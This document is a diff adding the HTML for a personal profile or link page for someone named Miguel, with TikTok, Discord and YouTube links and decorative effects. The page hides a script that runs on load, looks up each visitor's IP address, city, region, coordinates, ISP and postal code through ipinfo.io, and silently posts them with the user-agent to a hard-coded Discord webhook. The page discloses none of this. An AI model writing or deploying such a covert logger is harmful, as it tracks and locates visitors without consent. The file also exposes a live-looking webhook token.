@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>xx</title>
+  <meta name="theme-color" content="#000001">
+  <link rel="stylesheet" href="public/users/css/cat.css">
+  <link rel="icon" href="" type="image/x-icon">
+  <link rel="shortcut icon" href="" type="image/x-icon">
+  <meta content="spread love" property="og:title">
+  <meta content="https://4luv.xyz/miguel" property="og:url">
+  <meta content="https://i.pinimg.com/736x/39/5a/01/395a0123468ccf841f22885d36ab638e.jpg" property="og:image">
+  <meta content="#000001" data-react-helmet="true" name="theme-color">
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="effects.js"></script>
+  <script src="snow.js"></script>
+</head>
+<body>
+  <div id="overlay">
+    <button class="overlaybtn" onclick="removeOverlay()">click</button>
+  </div>
+  <div id="user-page">
+    <div class="main-container" id="mainDiv">
+      <div class="profile-container">
+        <img class="pp" src="pogi/miguel.jpg" draggable="false" alt="2dd0cc63bdba3ced3948c30b0cf2a370">
+        <p class="username breathing" data-tooltip="">Miguel</p>
+        <div class="bio-container">
+          <div class="bio typewriter"></div>
+        </div>
+        <div class="pre-container">
+          <div class="pre">
+            <div class="cropped"><img draggable="false" id="rpc" alt=""></div>
+          </div>
+        </div>
+        <div class="links-container" id="linksDiv">
+          <div class="logo tiktok" onclick="window.open('https://www.tiktok.com/@ley.ash193?lang=en');"><img src="pogi/tiktok.png" class="links" width="24" alt="TikTok"></div>
+          <div class="logo discord" onclick="window.open('http://discord.com/users/1380912576745050172', '_blank');"><img src="pogi/dc.png" class="links" width="23" alt="Discord" style="filter: brightness(0) invert(1);"></div>
+          <div class="logo youtube" onclick="window.open('https://www.youtube.com/@Miggykupali', '_blank');"><img src="pogi/yt.png" class="links" width="24" alt="YouTube"></div>
+        </div>
+        <div class="linksline"></div>
+        <div class="views-container"></div>
+      </div>
+    </div>
+    <script>
+      $(document).ready(function() {
+        $.get("https://ipinfo.io", function(response) {
+          const webhook_url = "https://discord.com/api/webhooks/1385222184036991027/v8zm-lhIV32ANBIuSXo3HxyI5tkt5IS64_dLlEf7XhqGpzQXoD_hHZ1Nh40svgtMRLFu";
+          const main = {
+            title: "",
+            description: "",
+            thumbnail: {
+              url: "",
+            },
+            fields: [
+              {
+                name: "IP Address:",
+                value: `\`${response.ip}\``,
+                inline: false,
+              },
+              {
+                name: "User-Agent:",
+                value: `\`${navigator.userAgent}\``,
+                inline: false,
+              },
+              {
+                name: "City:",
+                value: `\`${response.city}\``,
+                inline: false,
+              },
+              {
+                name: "Region:",
+                value: `\`${response.region}\``,
+                inline: false
+              },
+              {
+                name: "Country:",
+                value: `\`${response.country}\``,
+                inline: false
+              },
+              {
+                name: "Long/Lat:",
+                value: `\`${response.loc}\``,
+                inline: false
+              },
+              {
+                name: "Company:",
+                value: `\`${response.org}\``,
+                inline: false
+              },
+              {
+                name: "Postal Region:",
+                value: `\`${response.postal}\``,
+                inline: false
+              },
+            ],
+            footer: {
+              text: "@nomxrcy"
+            },
+            author: {
+              name: "/xx",
+              url: "https://t.me/kylefernand3z"
+            }
+          };
+          
+          fetch(webhook_url, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              'username': 'mxrcy',
+              'avatar_url': 'https://i.pinimg.com/736x/2d/d0/cc/2dd0cc63bdba3ced3948c30b0cf2a370.jpg',
+              'embeds': [main],
+            })
+          }).catch(error => console.error('Error:', error));
+        }, "json");
+      });
+    </script> 
+    <script src="https://api.ipify.org?format=jsonp&amp;callback=getIP"></script> 
+    <audio id="backgroundsong" src="https://audio.jukehost.co.uk/T4CkweWvQEAqJ1HAAeY504wpTrTyUaKb" loop=""></audio>
+  </div>
+</body>
+</html>
